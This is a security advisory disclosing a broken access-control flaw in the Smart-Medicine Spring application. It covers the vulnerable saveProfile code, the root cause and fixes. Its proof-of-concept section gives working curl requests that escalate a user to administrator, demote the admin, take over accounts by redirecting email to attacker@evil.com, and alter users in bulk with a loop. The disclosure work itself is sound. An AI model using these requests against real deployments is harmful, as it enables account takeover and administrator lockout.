# Vertical Privilege Escalation Vulnerability in Smart-Medicine System

## Vulnerability Overview

**Vulnerability Type**: Vertical Privilege Escalation / Broken Access Control

**Affected Software**: Smart-Medicine (智慧医药系统)

**Affected Versions**: All versions up to and including the current release (commit: cc3ec30)

**Severity**: Critical

**CVSS v3.1 Score**: 8.8 (High)

**CVSS Vector**: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

**Discoverer**: sh7err@vEcho

**Vendor**: XueWei (薛伟同学)

**Vendor Website**: http://xuewei.world

**Repository**: https://github.com/xw213400/smart-medicine

## Vulnerability Description

The Smart-Medicine system contains a critical vertical privilege escalation vulnerability in the user profile update functionality. The `saveProfile` method in `UserController.java` fails to validate whether the authenticated user is authorized to modify the target user's information. This allows any authenticated user to:

1. Escalate their own privileges from regular user (roleStatus=0) to administrator (roleStatus=1)
2. Modify arbitrary user accounts, including administrator accounts
3. Take over other user accounts by changing their email addresses
4. Demote administrators to regular users, effectively locking them out of administrative functions

The vulnerability exists because:
- No validation checks if the submitted user ID matches the currently authenticated user's ID
- Spring MVC automatically binds all request parameters to the User object, including sensitive fields like `roleStatus`, `userAccount`, and `userPwd`
- The backend directly saves the user-provided data without filtering sensitive attributes

## Technical Details

### Vulnerable Code

**Location**: `src/main/java/world/xuewei/controller/UserController.java` (lines 22-30)

```java
@PostMapping("/saveProfile")
public RespResult saveProfile(User user) {
    if (Assert.isEmpty(user)) {
        return RespResult.fail("保存对象不能为空");
    }
    // VULNERABLE: Directly saves user-submitted data without validation
    user = userService.save(user);
    session.setAttribute("loginUser", user);
    return RespResult.success("保存成功");
}
```

**Supporting Vulnerable Code**: `src/main/java/world/xuewei/service/UserService.java` (lines 48-55)

```java
@Override
public User save(User o) {
    if (Assert.isEmpty(o.getId())) {
        userDao.insert(o);
    } else {
        // VULNERABLE: Updates user by ID without authorization check
        userDao.updateById(o);
    }
    return userDao.selectById(o.getId());
}
```

### Attack Flow

1. **Attacker Authentication**: Attacker logs in with a regular user account (roleStatus=0)
2. **Profile Page Access**: Attacker navigates to the profile page, which contains a hidden input field with their user ID
3. **Request Manipulation**: Attacker intercepts or crafts a POST request to `/user/saveProfile`
4. **Privilege Escalation**: Attacker adds `roleStatus=1` parameter to the request
5. **Exploitation Success**: The backend updates the attacker's account to administrator status without validation

### Frontend Context

The legitimate frontend code (`custom.js:106-135`) retrieves the user ID from a hidden field:

```javascript
function updateProfile() {
    let id = $('#userId').val();  // User ID from hidden field
    $.ajax({
        url: "user/saveProfile",
        data: {
            id: id,
            userName: userName,
            userTel: userTel,
            userAge: userAge,
            imgPath: imgPath
            // Note: roleStatus not included by frontend, but can be added by attacker
        }
    });
}
```

The hidden field in `profile.html` (line 70-71):

```html
<input id="userId" style="display: none"
       th:value="${session.loginUser.id}" type="text"/>
```

While the frontend uses the authenticated user's ID, attackers can easily modify this value or craft their own requests.

## Proof of Concept

### Scenario 1: Self Privilege Escalation

```bash
# Assume attacker has regular user account with ID=5
# Attacker logs in and obtains valid session

# Escalate to administrator
curl -X POST "http://target-host/user/saveProfile" \
  -H "Cookie: JSESSIONID=attacker-session-id" \
  -d "id=5&userName=attacker&roleStatus=1"

# Response:
# {"code":"SUCCESS","message":"保存成功","data":{...,"roleStatus":1}}

# Attacker now has full administrative privileges
```

### Scenario 2: Modify Other User's Information

```bash
# Attacker modifies user ID=3's information
curl -X POST "http://target-host/user/saveProfile" \
  -H "Cookie: JSESSIONID=attacker-session-id" \
  -d "id=3&userName=CompromisedUser&userEmail=attacker@evil.com"

# Response:
# {"code":"SUCCESS","message":"保存成功"}

# User ID=3's information has been modified
```

### Scenario 3: Administrator Demotion Attack

```bash
# Attacker demotes administrator (ID=1) to regular user
curl -X POST "http://target-host/user/saveProfile" \
  -H "Cookie: JSESSIONID=attacker-session-id" \
  -d "id=1&roleStatus=0"

# Response:
# {"code":"SUCCESS","message":"保存成功"}

# Administrator loses all administrative privileges
# System becomes unmanageable
```

### Scenario 4: Account Takeover via Email Modification

```bash
# Step 1: Attacker modifies target user's email
curl -X POST "http://target-host/user/saveProfile" \
  -H "Cookie: JSESSIONID=attacker-session-id" \
  -d "id=3&userEmail=attacker@evil.com"

# Step 2: Use "Forgot Password" functionality with the modified email
# Step 3: Attacker receives password reset link and takes over the account
```

### Scenario 5: Mass Account Manipulation

```bash
# Attacker can modify all users in the system
for user_id in {1..100}; do
  curl -X POST "http://target-host/user/saveProfile" \
    -H "Cookie: JSESSIONID=attacker-session-id" \
    -d "id=${user_id}&userName=Compromised_${user_id}&roleStatus=0"
done

# All users are modified, administrators are demoted
```

## Impact Analysis

### Access Control Impact: CRITICAL

The vulnerability completely bypasses the role-based access control system:
- Regular users can gain administrator privileges
- Administrators can be demoted to regular users
- Cross-account modifications are possible without authorization

### Confidentiality Impact: HIGH

- Attackers can access and modify sensitive user information
- Email addresses can be changed, enabling account takeover
- User profile data can be exfiltrated

### Integrity Impact: HIGH

- User account data can be arbitrarily modified
- Role assignments can be manipulated
- Account information can be corrupted

### Availability Impact: HIGH

- Legitimate administrators can be locked out by privilege demotion
- System becomes unmanageable if all administrators are demoted
- Mass account modifications can disrupt normal operations

### Business Impact: CRITICAL

1. **Complete Loss of Access Control**: The role-based permission system becomes meaningless
2. **Administrative Control Loss**: Attackers can lock out legitimate administrators
3. **Account Takeover**: Any user account can be compromised
4. **Data Breach**: Sensitive user information can be accessed and modified
5. **Regulatory Compliance**: Violation of data protection and access control requirements

## Root Cause Analysis

The vulnerability stems from three interconnected issues:

1. **Missing Authorization Check**: The `saveProfile` method does not verify if the authenticated user (`loginUser.getId()`) matches the target user ID (`user.getId()`)

2. **Unrestricted Parameter Binding**: Spring MVC automatically binds all HTTP parameters to the User object, including sensitive fields that should never be user-modifiable:
   - `id` - Allows targeting any user
   - `roleStatus` - Allows privilege escalation
   - `userAccount` - Allows account name changes
   - `userPwd` - Could allow password changes (if exploited differently)

3. **Direct Object Reference**: The application uses user-supplied IDs directly without validation (Insecure Direct Object Reference - IDOR)

## Recommendations

### Immediate Fix (P0 - Critical)

**Option 1: Enforce Current User ID (Recommended)**

```java
@PostMapping("/saveProfile")
public RespResult saveProfile(User user) {
    if (Assert.isEmpty(user) || Assert.isEmpty(loginUser)) {
        return RespResult.fail("Please login first");
    }

    // CRITICAL FIX: Verify user can only modify their own profile
    if (!loginUser.getId().equals(user.getId())) {
        return RespResult.fail("You can only modify your own profile");
    }

    // CRITICAL FIX: Prevent modification of sensitive fields
    User dbUser = userService.get(loginUser.getId());
    if (dbUser == null) {
        return RespResult.fail("User not found");
    }

    // Only update safe fields
    dbUser.setUserName(user.getUserName());
    dbUser.setUserAge(user.getUserAge());
    dbUser.setUserSex(user.getUserSex());
    dbUser.setUserTel(user.getUserTel());
    dbUser.setImgPath(user.getImgPath());
    // DO NOT UPDATE: id, userAccount, roleStatus, userPwd

    dbUser = userService.save(dbUser);
    session.setAttribute("loginUser", dbUser);
    return RespResult.success("Profile updated successfully");
}
```

**Option 2: Use DTO Pattern**

```java
// Create a Data Transfer Object with only allowed fields
public class UpdateProfileDTO {
    private String userName;
    private Integer userAge;
    private String userSex;
    private String userTel;
    private String imgPath;
    // Exclude: id, userAccount, roleStatus, userPwd
}

@PostMapping("/saveProfile")
public RespResult saveProfile(UpdateProfileDTO dto) {
    if (Assert.isEmpty(loginUser)) {
        return RespResult.fail("Please login first");
    }

    User user = userService.get(loginUser.getId());
    BeanUtils.copyProperties(dto, user);
    user = userService.save(user);
    session.setAttribute("loginUser", user);
    return RespResult.success("Profile updated successfully");
}
```

### Additional Security Measures

1. **Input Validation**: Implement strict validation on all user inputs
2. **Audit Logging**: Log all profile modification attempts with user IDs
3. **Rate Limiting**: Implement rate limiting to prevent mass exploitation
4. **Security Testing**: Add integration tests to verify authorization checks

## Timeline

- **2025-11-10**: Vulnerability discovered during security code audit
- **2025-11-10**: Vulnerability verified through code review and data flow analysis
- **2025-11-10**: Exploitation confirmed via proof of concept
- **2025-11-10**: CVE request initiated

## References

- Project Repository: https://github.com/xw213400/smart-medicine
- Author's Blog: http://xuewei.world
- Vulnerable Code: `src/main/java/world/xuewei/controller/UserController.java:22-30`
- CWE-639: Authorization Bypass Through User-Controlled Key
- CWE-862: Missing Authorization

## Credits

**Discoverer**: sh7err@vEcho

**Contact**: [Contact information available upon request]

## Disclaimer

This vulnerability report is provided for educational and security research purposes. The discoverer has responsibly disclosed this vulnerability and followed ethical security research practices. No malicious exploitation was performed against production systems during the research.

---

**Report Version**: 1.0

**Last Updated**: 2025-11-10
